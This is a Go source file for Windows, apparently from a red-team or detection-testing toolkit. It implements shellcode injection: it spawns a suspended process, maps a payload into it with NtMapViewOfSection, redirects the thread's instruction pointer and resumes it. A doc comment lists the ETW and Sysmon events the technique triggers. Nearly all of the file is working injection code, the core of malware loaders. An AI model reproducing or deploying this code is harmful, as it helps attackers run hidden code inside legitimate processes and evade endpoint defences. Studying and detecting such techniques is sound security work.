//go:build windows

package technique

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// SectionInject injects shellcode into a suspended target process via NtMapViewOfSection.
//
// Detection fingerprint:
//   - ETW KERNEL_THREATINT_KEYWORD_MAPVIEW: NtMapViewOfSection into foreign process
//   - Sysmon Event 25: ProcessTampering (executable remote mapping)
//   - Sysmon Event 10: OpenProcess from injector
//   - Thread RIP redirected outside any loaded PE (no Event 8 — no CreateRemoteThread)
func SectionInject(target string, shellcode []byte) error {
	fmt.Printf("  [technique] NtMapViewOfSection\n")
	fmt.Printf("  [target]    %s  payload %d bytes\n", target, len(shellcode))

	pi, err := spawnProcess(target, true)
	if err != nil {
		return err
	}
	fmt.Printf("  [spawned]   PID %d TID %d (suspended)\n", pi.ProcessId, pi.ThreadId)

	defer func() {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	localAddr, remoteAddr, section, err := writeSection(pi.Process, shellcode)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	defer procNtClose.Call(uintptr(section))
	fmt.Printf("  [remote map] 0x%x (RX, PID %d)\n", remoteAddr, pi.ProcessId)

	ac, err := getThreadContext(pi.Thread)
	if err != nil {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	ac.ctx.SetRip(uint64(remoteAddr))
	if err := setThreadContext(pi.Thread, ac); err != nil {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	fmt.Printf("  [ctx]       RIP → 0x%x\n", remoteAddr)

	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)

	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   PID %d\n", pi.ProcessId)
	return nil
}
